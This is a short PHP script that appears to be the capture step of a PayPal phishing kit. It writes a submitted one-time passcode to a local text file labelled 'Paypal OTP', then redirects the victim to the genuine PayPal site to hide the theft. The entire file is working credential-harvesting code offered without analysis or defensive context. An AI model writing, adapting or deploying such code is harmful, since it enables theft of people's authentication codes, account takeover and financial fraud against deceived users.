<?php
file_put_contents("otp.txt", "Paypal OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/');
?>
